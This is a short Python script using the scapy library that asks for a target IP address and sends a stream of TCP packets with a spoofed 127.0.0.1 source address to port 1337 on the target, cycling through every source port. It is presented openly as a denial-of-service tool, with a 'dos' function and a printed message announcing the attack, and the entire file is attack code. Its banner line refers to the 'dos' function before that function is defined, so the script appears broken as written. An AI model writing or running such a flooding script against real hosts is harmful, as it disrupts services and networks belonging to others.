from banner import *
from scapy.all import *
banner = dos
print (colored(banner, "red"))

src = "127.0.0.1"
dst = input("enter target ip : ")
def dos(src,dst):
	for port in range(65535):
		ip = IP(src=src , dst=dst)
		tcp = TCP(sport=port , dport =1337)
		packet = ip/tcp
		send(packet)
		print (colored("Now he's doing the attack","green"))

dos(src,dst)
	
